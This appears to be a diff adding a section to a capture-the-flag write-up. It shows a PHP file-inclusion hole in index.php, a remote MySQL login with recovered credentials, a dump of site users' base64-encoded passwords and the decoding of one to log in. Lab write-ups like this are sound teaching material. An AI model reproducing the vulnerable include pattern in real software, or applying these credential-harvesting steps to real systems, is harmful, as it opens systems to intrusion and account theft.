@@ -57,3 +57,40 @@ $database = "Users";
 ?>
 ```
 
+These credentials will be useful in the next step.
+
+Additionally, I can decode the relevant section of index.php to see how this all works:
+
+```
+if (isset($_GET['page']))
+	{
+		include($_GET['page'].".php");
+	}
+```
+
+## MySql and login
+
+I can use the credentials above to log into mysql remotely (`mysql -h <ip> -u root -p` plus the password from above). It contained a single table of note, containing the users for the site with encoded passwords:
+
+```
+MySQL [Users]> select * from users;
++------+------------------+
+| user | pass             |
++------+------------------+
+| kent | Sld6WHVCSkpOeQ== |                                                                                                                                                                                                 
+| mike | U0lmZHNURW42SQ== |                                                                                                                                                                                                 
+| kane | aVN2NVltMkdSbw== |                                                                                                                                                                                                 
++------+------------------+                                                                                                                                                                                                 
+3 rows in set (0.001 sec)       
+```
+
+The encoding is obviously base64, though I can determine this for sure using the trick above to get the login page source code:
+
+```
+$luser = $_POST['user'];
+$lpass = base64_encode($_POST['pass']);
+
+$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
+```
+
+Choosing kane (obviously, my Brotherhood of Nod allegience is strong), his password is decoded to `iSv5Ym2GRo`. I use this to log into the site.
